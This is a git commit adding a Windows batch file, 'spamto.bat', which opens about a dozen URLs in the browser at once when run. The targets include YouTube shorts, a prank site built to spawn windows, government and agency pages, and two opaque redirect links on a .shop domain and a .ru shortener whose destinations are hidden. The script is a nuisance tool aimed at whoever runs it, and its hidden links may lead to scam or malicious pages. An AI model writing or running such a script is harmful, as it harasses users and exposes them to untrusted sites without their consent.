7dfe80d9cf4c6699494d7b8f8d59b065614e4066
cosmos <lukeda20122012@gmail.com>
2025-07-19 08:10:25 +0900

    Add files via upload

---
+++ spamto.bat
@@ -0,0 +1,14 @@
+@echo off
+start "" "https://youtube.com/shorts/7-5UbNWtGV4?si=OYsrRXgSGaGIItif"
+start "" "https://youtube.com/shorts/H0mcliSv85I?si=GLogh6zm4VftYkp0"
+start "" "https://youtu.be/s9iShOQP580?si=SKFqNxgARxt6NXee"
+start "" "https://youtube.com/shorts/GApRy4mY4g8?si=nZXB0Z5pQcR8SiBJ"
+start "" "theannoyingsite.com"
+start "" "https://vy.hiphaltlauroyl.shop/ivdluWpU0K7V/wgLvV?param_4=1130915&param_5=1563061524960320818"
+start "" "https://ts6.pl/H0xm6gW.ru"
+start"" "https://funbe487.com/webtoon"
+start"" "https://www.mofa.go.kr/minister/wpge/m_20036/contents.do"
+start"" "https://www.mofa.go.kr/www/brd/m_4076/view.do?seq=371439"
+start"" "https://www.esa.int/ESA_Multimedia/Missions/Solar_Orbiter/(result_type)/images"
+start"" "https://usbkill.com/"
+exit
